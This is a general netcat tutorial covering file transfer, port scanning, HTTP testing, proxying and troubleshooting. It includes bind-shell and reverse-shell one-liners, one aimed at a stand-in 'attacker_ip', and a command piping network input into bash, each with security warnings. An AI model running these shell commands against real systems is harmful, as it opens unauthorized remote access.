# Netcat (nc) - The Swiss Army Knife of Networking

Netcat is a versatile networking utility for reading/writing data across network connections.

## Installation

```bash
# Most systems have it pre-installed

# Debian/Ubuntu
sudo apt install netcat-traditional  # or netcat-openbsd

# RHEL/CentOS
sudo yum install nc

# macOS (pre-installed)
nc

# Check version
nc -h
```

**Note**: There are different implementations (traditional, OpenBSD). Commands may vary slightly.

## Basic Syntax

```bash
nc [options] [hostname] [port]
```

## Simple Communication

### Server (Listen Mode)

```bash
# Listen on port 1234
nc -l 1234

# Listen on specific interface
nc -l -p 1234 127.0.0.1

# Keep listening after client disconnects
nc -l -k 1234
```

### Client (Connect Mode)

```bash
# Connect to server
nc localhost 1234

# Type messages and press Enter
# Ctrl+C to exit
```

**Example Chat**:
```bash
# Terminal 1 (Server)
nc -l 1234

# Terminal 2 (Client)
nc localhost 1234

# Now type in either terminal to send messages
```

## File Transfer

### Send File

```bash
# Server (receiver)
nc -l 1234 > received_file.txt

# Client (sender)
nc localhost 1234 < file_to_send.txt
```

### Send Directory (with tar)

```bash
# Server (receiver)
nc -l 1234 | tar xzf -

# Client (sender)
tar czf - /path/to/directory | nc localhost 1234
```

### Progress with pv

```bash
# Show progress during transfer
nc -l 1234 | pv > received_file.txt

# Sender with progress
pv file.txt | nc localhost 1234
```

## Port Scanning

### Scan Single Port

```bash
# Check if port 80 is open
nc -zv example.com 80

# -z: Zero-I/O mode (scanning)
# -v: Verbose
```

### Scan Port Range

```bash
# Scan ports 20-100
nc -zv example.com 20-100

# Scan common ports
nc -zv example.com 80 443 22 21
```

### Quick Port Check

```bash
# Quick check (timeout 1 second)
nc -zv -w 1 example.com 80

# Scan without verbose
nc -z example.com 80 && echo "Port open" || echo "Port closed"
```

## Remote Shell (Be Careful!)

### Bind Shell (Dangerous!)

```bash
# Server - Listen and give shell access
nc -l 1234 -e /bin/bash

# Client - Connect and get shell
nc target_ip 1234
```

### Reverse Shell (Penetration Testing)

```bash
# Attacker machine - Listen
nc -l 1234

# Target machine - Connect back with shell
nc attacker_ip 1234 -e /bin/bash
```

**⚠️ Security Warning**: These are dangerous! Only use in controlled environments for testing.

## Web Requests

### Simple HTTP GET

```bash
# Manual HTTP request
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

### Test Web Server

```bash
# Check if web server responds
printf "GET / HTTP/1.0\r\n\r\n" | nc example.com 80
```

### Simple Web Server

```bash
# Serve single response
while true; do
  echo -e "HTTP/1.1 200 OK\r\n\r\nHello World" | nc -l 8080
done
```

## UDP Communication

```bash
# UDP server
nc -u -l 1234

# UDP client
nc -u localhost 1234

# -u: UDP mode (default is TCP)
```

## Timeout Options

```bash
# Wait 5 seconds for connection
nc -w 5 example.com 80

# Timeout after 10 seconds of inactivity
nc -i 10 -l 1234

# -w: Connection timeout
# -i: Idle timeout
```

## Proxy/Relay

### Simple Proxy

```bash
# Forward port 8080 to remote port 80
mkfifo backpipe
nc -l 8080 < backpipe | nc example.com 80 > backpipe
```

### Port Forwarding

```bash
# Relay connections
nc -l localhost 8080 -c 'nc target_host 80'
```

## Practical Examples

### 1. Quick File Share

```bash
# Share file (server)
nc -l 1234 < secret_file.txt

# Download file (client)
nc server_ip 1234 > secret_file.txt
```

### 2. Backup Over Network

```bash
# Receiver
nc -l 1234 | tar xzf - -C /backup/

# Sender
tar czf - /important/data | nc backup_server 1234
```

### 3. Test if Port is Open

```bash
# Quick check
nc -zv google.com 443 && echo "HTTPS works"
```

### 4. Stream Video

```bash
# Server - Stream video
nc -l 1234 < video.mp4

# Client - Receive and play
nc server_ip 1234 | vlc -
```

### 5. Simple Chat Server

```bash
# Server with multiple clients (using named pipe)
mkfifo chatpipe
nc -l 1234 < chatpipe | tee -a chat.log | nc -l 1235 > chatpipe
```

### 6. Check Service Response

```bash
# Test SSH banner
nc localhost 22

# Test SMTP
nc localhost 25
EHLO test
QUIT
```

### 7. Remote Command Execution

```bash
# Server - Execute commands from client
nc -l 1234 | /bin/bash

# Client - Send commands
echo "ls -la" | nc localhost 1234
```

### 8. Database Connection Test

```bash
# Test if MySQL is accessible
nc -zv mysql_server 3306

# Test PostgreSQL
nc -zv postgres_server 5432
```

## Debugging Network Issues

### Check Connectivity

```bash
# Test if host is reachable on specific port
nc -zv example.com 80

# Test multiple services
for port in 80 443 22; do
  nc -zv example.com $port
done
```

### Test Firewall Rules

```bash
# Check if firewall allows connection
nc -zv -w 2 internal_server 8080
```

### Bandwidth Test

```bash
# Server
nc -l 1234 > /dev/null

# Client (generate random data)
dd if=/dev/zero bs=1M count=100 | nc server_ip 1234

# Add pv for speed measurement
dd if=/dev/zero bs=1M count=100 | pv | nc server_ip 1234
```

## Common Options

```bash
-l              Listen mode (server)
-p <port>       Specify port
-v              Verbose output
-n              No DNS lookup (use IP only)
-z              Zero-I/O mode (port scanning)
-w <seconds>    Connection timeout
-i <seconds>    Idle timeout
-u              UDP mode
-k              Keep listening (accept multiple connections)
-e <command>    Execute command (dangerous!)
-c <command>    Execute command with /bin/sh
```

## Practical Use Cases

### Development

```bash
# Test if app server is running
nc -zv localhost 3000

# Quick data sender for testing
echo "test data" | nc localhost 8080
```

### System Administration

```bash
# Check if remote service is up
nc -zv prod_server 443

# Transfer logs to central server
cat /var/log/app.log | nc log_server 9999
```

### Security Testing

```bash
# Banner grabbing
nc -v target_host 22

# Port scanning
nc -zv target_host 1-1000
```

### Data Pipeline

```bash
# Stream processing
nc -l 1234 | grep ERROR | mail -s "Errors" admin@example.com
```

## Security Considerations

**⚠️ Warnings**:
1. **Don't use `-e` flag in production** - Huge security risk
2. **Encrypt sensitive data** - Netcat sends everything in plain text
3. **Use firewall rules** - Limit who can connect
4. **Prefer SSH for shells** - More secure than netcat shells
5. **Be careful with reverse shells** - Often flagged as malicious

**Better Alternatives**:
- **SSH** for remote shells
- **SCP/rsync** for file transfers
- **OpenSSL s_client** for encrypted connections
- **socat** for more features

## Encrypted Connection (with OpenSSL)

Since netcat doesn't encrypt, use with OpenSSL:

```bash
# Server - Listen with SSL
openssl s_server -quiet -key key.pem -cert cert.pem -port 1234

# Client - Connect with SSL
openssl s_client -quiet -connect localhost:1234
```

## Troubleshooting

### Connection Refused

```bash
# Check if port is actually listening
nc -zv localhost 1234
netstat -tlnp | grep 1234
```

### Firewall Blocking

```bash
# Test from different ports
nc -p 8080 server_ip 1234

# Check firewall rules
sudo iptables -L
```

### Timeout Issues

```bash
# Increase timeout
nc -w 30 slow_server 80
```

## Netcat Alternatives

- **socat** - More powerful, supports SSL, proxies
- **ncat** - Nmap's version with SSL support
- **cryptcat** - Encrypted version of netcat
- **SSH** - For secure remote access

## Quick Reference

```bash
# Listen on port
nc -l 1234

# Connect to port
nc hostname 1234

# Port scan
nc -zv hostname 80

# File transfer (send)
nc hostname 1234 < file.txt

# File transfer (receive)
nc -l 1234 > file.txt

# UDP mode
nc -u hostname 1234

# Web request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc example.com 80
```

## Real-World Scenarios

### Scenario 1: Quick Log Analysis

```bash
# Stream logs to analyst machine
tail -f /var/log/app.log | nc analyst_machine 9999

# Analyst receives and searches
nc -l 9999 | grep ERROR
```

### Scenario 2: Database Migration

```bash
# Export database to remote server
mysqldump database | nc backup_server 1234

# Remote server imports
nc -l 1234 | mysql database
```

### Scenario 3: Service Health Check

```bash
# Check if all services are running
#!/bin/bash
services=("web:80" "api:8080" "db:3306")
for service in "${services[@]}"; do
  host="${service%%:*}"
  port="${service##*:}"
  nc -zv -w 2 $host $port
done
```

## Tips

1. **Always use `-v` for visibility** - Know what's happening
2. **Use `-w` timeout** - Don't wait forever
3. **Combine with other tools** - `pv`, `tar`, `grep`, etc.
4. **Test in safe environment** - Especially with `-e` flag
5. **Check both TCP and UDP** - Different protocols, different behaviors

**Remember**: Netcat is powerful but transmits data in plain text. For production, use encrypted alternatives like SSH or SSL/TLS connections!
